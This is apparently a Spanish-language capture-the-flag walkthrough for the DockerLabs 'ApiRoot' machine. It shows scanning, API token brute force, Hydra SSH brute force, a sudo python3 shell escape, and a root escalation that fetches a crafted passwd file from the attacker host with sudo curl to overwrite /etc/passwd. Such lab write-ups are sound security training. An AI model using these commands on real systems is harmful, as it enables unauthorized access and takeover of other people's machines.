---
icon: flag
---

# ApiRoot DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip apiroot.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh apiroot.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 07:34 EST
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 19:f1:08:79:13:c4:42:b8:6c:c8:a3:3e:f5:39:a3:59 (ECDSA)
|_  256 9b:93:02:4e:d2:08:f7:d7:eb:90:48:e4:48:17:1b:f5 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.2.2 Python/3.11.2
|     Date: Sun, 16 Feb 2025 12:34:48 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 3520
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="es">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>
|     API?</title>
|     <style>
|     Estilos generales */
|     body {
|     font-family: Arial, sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #121212; /* Fondo oscuro */
|     color: #e0e0e0; /* Texto claro */
|     .container {
|     max-width: 800px;
|     margin: 50px auto;
|     padding: 20px;
|     background: #1e1e1e; /* Contenedor oscuro */
|     border-radius: 8px;
|     box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.5);
|     text-
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=2/16%Time=67B1DB68%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,E6F,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.2\.2\
SF:x20Python/3\.11\.2\r\nDate:\x20Sun,\x2016\x20Feb\x202025\x2012:34:48\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x203520\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20la
SF:ng=\"es\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x
SF:20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x
SF:20initial-scale=1\.0\">\n\x20\x20\x20\x20<title>\xc2\xbfQu\xc3\xa9\x20e
SF:s\x20una\x20API\?</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20/\*\x20Estilos\x20generales\x20\*/\n\x20\x20\x20\x20\x20\x
SF:20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fo
SF:nt-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20padding:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20b
SF:ackground-color:\x20#121212;\x20/\*\x20Fondo\x20oscuro\x20\*/\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#e0e0e0;\x20/\*\x20Te
SF:xto\x20claro\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\.container\x20{\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20max-width:\x20800px;\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x2050px\x20auto;\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2020px;\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#1e1e1e;\x20
SF:/\*\x20Contenedor\x20oscuro\x20\*/\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20border-radius:\x208px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20box-shadow:\x200px\x200px\x2015px\x20rgba\(0,\x200,\x200,
SF:\x200\.5\);\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-")%r(
SF:RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x2
SF:0\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\"
SF:>\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x
SF:20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>
SF:Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\
SF:x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x20400\x20-\x20Bad\x20
SF:request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x2
SF:0</body>\n</html>\n");
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.43 seconds
```

Si entramos en la pagina por el puerto `5000` veremos una pagina en la que nos pone en un formato de terminal que hay una carpeta llamada `/api`, pero si entramos de forma manual no veremos nada, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>:5000/api/ -w <WORDLIST> -x html,php,txt -t 100
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:5000/api/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 401) [Size: 31]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un directorio llamado `/api/users` por lo que vamos a ver que contiene:

<figure><img src="../../.gitbook/assets/image (185) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que esta utilizando una `API` como ya nos temiamos al principio de la pagina, por lo que vamos a intentar encontrar alguna vulnerabilidad respecto a las `API's`.

Por lo que podemos deducir como es una carpeta llamada `users` se puede saber que cada usuario tendria que tener asociado un `ID` en este caso en formato de numeros, por ejemplo si ponemos lo siguiente:

```
URL = http://<IP>:5000/api/users/1
```

Nos sigue poniendo `No autorizado`, pero no nos esta dando un `404 Not Found` por lo que esta funcionando, pero no conseguiremos mucho mas, por lo que vamos a realizar un poco de bruta respecto a las `API's` con el siguiente script.

## BruteAPI Script

URL = [Script Fuerza bruta APIs](https://github.com/Maalfer/bruteapi)

Con este script vamos a realizar fuerza bruta con la direccion de la `API` junto con un diccionario de palabras para probarlas en la `URL` utilizando `curl`, pero si probamos algunas de las opciones que viene en el script no vamos a encontrar suerte, menos en una opcion que sera la siguiente:

```shell
bash bruteapi.sh http://<IP>:5000/api/users /usr/share/wordlists/rockyou.txt
```

Info:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔐 Selecciona el método de autenticación:
1) Basic Auth (requiere usuario)
2) Bearer Token
3) API Key en encabezado
4) API Key en la URL
5) 🔄 Probar todos los métodos
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Ingrese la opción (1-5): 2

..................................................................................

[→] Ejecutando: curl -H 'Authorization: Bearer password1' http://172.17.0.2:5000/api/users
   Respuesta HTTP: 200
[✓] Contraseña encontrada: password1
✅ Proceso completado.
```

Vemos que hemos encontrado una coincidencia con el metodo de `Bearer Token` por lo que si ahora nosotros accedemos en esa `URL` que hemos encontrado que funciona, veremos lo siguiente:

```shell
curl -H 'Authorization: Bearer password1' http://172.17.0.2:5000/api/users
```

Info:

```
[
  {
    "id": 1,
    "nombre": "bob"
  },
  {
    "id": 2,
    "nombre": "dylan"
  }
]
```

Por lo que vemos obtenemos `2` nombres de usuarios, que con esto ya podremos realizar fuerza bruta con dichos nombres de usuarios para ver si coincidieran algunas credenciales para `SSH`.

## Escalate user bob

> users.txt

```
bob
dylan
```

### Hydra

```shell
hydra -L users.txt -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-16 10:25:13
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 28688798 login tries (l:2/p:14344399), ~448263 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: bob   password: password1
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

### SSH

```shell
ssh bob@<IP>
```

Metemos como contraseña `password1` y veremos que estamos dentro.

## Escalate user balulero

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bob on b4b6bf85edb6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bob may run the following commands on b4b6bf85edb6:
    (balulero) NOPASSWD: /usr/bin/python3
```

Vemos que podemos ejecutar el binario `python3` como el usuario `balulero`, por lo que haremos lo siguiente:

```shell
sudo -u balulero python3 -c 'import os; os.system("/bin/bash")'
```

Info:

```
balulero@b4b6bf85edb6:/home/bob$ whoami
balulero
```

Con esto ya seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for balulero on b4b6bf85edb6:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User balulero may run the following commands on b4b6bf85edb6:
    (ALL) NOPASSWD: /usr/bin/curl
```

Veremos que podemos ejecutar el binario `curl` como el usuario `root`, por lo que haremos lo siguiente:

Vamos a crear un archivo llamado `passwd` para clonar el `passwd` de la maquina victima y sobreescribirlo en la maquina victima desde nuestra maquina `host`, copiamos el contenido del `passwd` de la maquina victima y generamos el archivo en la maquina `host` pero quitandole la `x` al usuario `root` para dejarle sin contraseña y poder escalar directamente.

```shell
nano passwd

#Dentro del nano
root::0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
balulero:x:1000:1000:balulero,,,:/home/balulero:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
bob:x:1001:1001:bob,,,:/home/bob:/bin/bash
```

Ahora abriremos un servidor de `python3` para sobreescribirlo desde la maquina victima.

```shell
python3 -m http.server
```

Ahora en la maquina victima realizamos lo siguiente:

```shell
URL=http://<IP>:8000/passwd
LFILE=/etc/passwd
sudo curl $URL -o $LFILE
```

Info:

```
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1187  100  1187    0     0   136k      0 --:--:-- --:--:-- --:--:--  144k
```

Una vez echo esto, haremos lo siguiente:

```shell
su root
```

Info:

```
root@b4b6bf85edb6:/home/balulero# whoami
root
```

Y con esto ya seremos `root`, por lo que habremos terminado la maquina.
